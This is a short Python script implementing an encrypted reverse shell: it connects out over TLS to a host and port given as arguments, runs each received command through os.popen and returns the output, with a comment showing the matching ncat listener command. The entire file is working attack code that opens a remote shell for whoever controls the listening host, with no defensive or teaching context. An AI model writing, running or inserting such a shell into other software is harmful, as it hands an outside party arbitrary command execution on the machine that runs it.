#!/usr/bin/python

# ncat --ssl -vlp 8888

import socket
import os
import ssl
import sys

host = sys.argv[1] # 127.0.0.1
port = sys.argv[2] # 8888

sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
wsocket = ssl.wrap_socket(sck, ssl_version=ssl.PROTOCOL_TLSv1)

wsocket.connect((host, int(port)))

while True:
	command = wsocket.recv(1000)
	result = os.popen(command).read()

	wsocket.send(result)